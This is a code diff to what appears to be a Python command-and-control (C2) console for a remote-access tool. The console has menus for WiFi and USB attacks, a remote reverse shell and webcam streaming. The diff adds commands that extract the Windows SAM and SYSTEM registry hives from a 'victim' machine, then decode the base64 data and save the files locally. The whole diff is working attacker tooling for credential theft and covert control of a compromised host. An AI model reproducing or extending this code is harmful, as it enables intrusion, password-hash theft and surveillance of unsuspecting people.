@@ -6,6 +6,7 @@ import time
 import json
 import cv2
 import numpy as np
+import base64
 
 # ======================================================
 # LOAD CONFIG
@@ -25,7 +26,7 @@ C2_PORT = config.get('C2_PORT', 4444)
 C2_HOST = config.get('C2_HOST', '0.0.0.0')
 
 # ======================================================
-# MENU HIERARCHY (SCREENSHOT REMOVED)
+# MENU HIERARCHY
 # ======================================================
 menu_hierarchy = {
     "Main Menu": ["1. WiFi Attack", "2. Remote USB Attack", "3. C2 Settings", "4. Prank Features", "Exit"],
@@ -47,6 +48,8 @@ menu_hierarchy = {
         "2.10 Capture Webcam",
         "2.11 Start Webcam Stream",
         "2.12 Stop Webcam Stream",
+        "2.13 Extract SAM",
+        "2.14 Extract SYSTEM",
         "Back"
     ],
     "3. C2 Settings": ["3.1 Target Info", "3.2 Connection Status", "Back"],
@@ -310,6 +313,60 @@ def start_c2_listener():
         print(f"[-] Listener error: {e}")
 
 # ======================================================
+# HANDLE SAM FILE
+# ======================================================
+def handle_sam_file(response):
+    try:
+        if response.startswith("SAM_FILE:"):
+            encoded = response.split(":", 1)[1].strip()
+            
+            missing_padding = len(encoded) % 4
+            if missing_padding:
+                encoded += '=' * (4 - missing_padding)
+            
+            file_data = base64.b64decode(encoded)
+            save_path = os.path.join(os.getcwd(), "SAM.hive")
+            
+            with open(save_path, 'wb') as f:
+                f.write(file_data)
+            
+            print(f"\n[+] SAM extracted successfully!")
+            print(f"[+] Saved to: {save_path}")
+            print(f"[+] File size: {len(file_data) / 1024:.2f} KB")
+            return True
+        return False
+    except Exception as e:
+        print(f"[!] Error: {e}")
+        return False
+
+# ======================================================
+# HANDLE SYSTEM FILE
+# ======================================================
+def handle_system_file(response):
+    try:
+        if response.startswith("SYSTEM_FILE:"):
+            encoded = response.split(":", 1)[1].strip()
+            
+            missing_padding = len(encoded) % 4
+            if missing_padding:
+                encoded += '=' * (4 - missing_padding)
+            
+            file_data = base64.b64decode(encoded)
+            save_path = os.path.join(os.getcwd(), "SYSTEM.hive")
+            
+            with open(save_path, 'wb') as f:
+                f.write(file_data)
+            
+            print(f"\n[+] SYSTEM extracted successfully!")
+            print(f"[+] Saved to: {save_path}")
+            print(f"[+] File size: {len(file_data) / 1024:.2f} KB")
+            return True
+        return False
+    except Exception as e:
+        print(f"[!] Error: {e}")
+        return False
+
+# ======================================================
 # SEND COMMAND
 # ======================================================
 def send_c2_command(cmd_string):
@@ -332,14 +389,19 @@ def send_c2_command(cmd_string):
         target_connection.settimeout(None)
         
         target_connection.send(cmd_string.encode('utf-8'))
-        target_connection.settimeout(10)
-        raw_response = target_connection.recv(4096).decode('utf-8')
+        target_connection.settimeout(60)
+        raw_response = target_connection.recv(8192).decode('utf-8')
         target_connection.settimeout(None)
         
         clean_response = raw_response.strip()
         
         if clean_response:
-            print(f"\n[+] Execution Response from Target:\n{clean_response}")
+            if clean_response.startswith("SAM_FILE:"):
+                handle_sam_file(clean_response)
+            elif clean_response.startswith("SYSTEM_FILE:"):
+                handle_system_file(clean_response)
+            else:
+                print(f"\n[+] Execution Response from Target:\n{clean_response}")
         else:
             print("\n[+] Command executed successfully (no response data).")
         return True
@@ -390,7 +452,7 @@ def display_menu():
     print("(Use: 'w'=UP, 's'=DOWN, 'Enter'=SELECT)")
 
 # ======================================================
-# EXECUTE ACTION (SCREENSHOT REMOVED)
+# EXECUTE ACTION
 # ======================================================
 def execute_action(item):
     global current_menu, selected_index, target_connection, target_address, cached_fingerprint, stream_active
@@ -432,13 +494,6 @@ def execute_action(item):
     
     elif item == "2.3 Full System Info":
         send_c2_command("RUN:SYS_INFO")
-
-    # SCREENSHOT REMOVED
-    elif item == "2.4 Capture Screenshot":
-        print("\n[!] Screenshot feature has been removed.")
-        print("[+] Command not sent to victim.")
-        input("\nPress Enter to return...")
-        return
 
     elif item == "2.4 Remote Reverse Shell":
         with connection_lock:
@@ -536,6 +591,20 @@ def execute_action(item):
         send_c2_command("RUN:STREAM_STOP")
         time.sleep(1)
         print("[+] Stream stopped successfully!")
+
+    # ========== EXTRACT SAM ==========
+    elif item == "2.13 Extract SAM":
+        print("[*] Extracting SAM from victim...")
+        print("[*] This may take a few moments...")
+        send_c2_command("RUN:EXTRACT_SAM")
+        input("\nPress Enter to return...")
+
+    # ========== EXTRACT SYSTEM ==========
+    elif item == "2.14 Extract SYSTEM":
+        print("[*] Extracting SYSTEM from victim...")
+        print("[*] This may take a few moments...")
+        send_c2_command("RUN:EXTRACT_SYSTEM")
+        input("\nPress Enter to return...")
 
     # ========== PRANK FEATURES ==========
     elif item == "4.1 Play Voice Message":
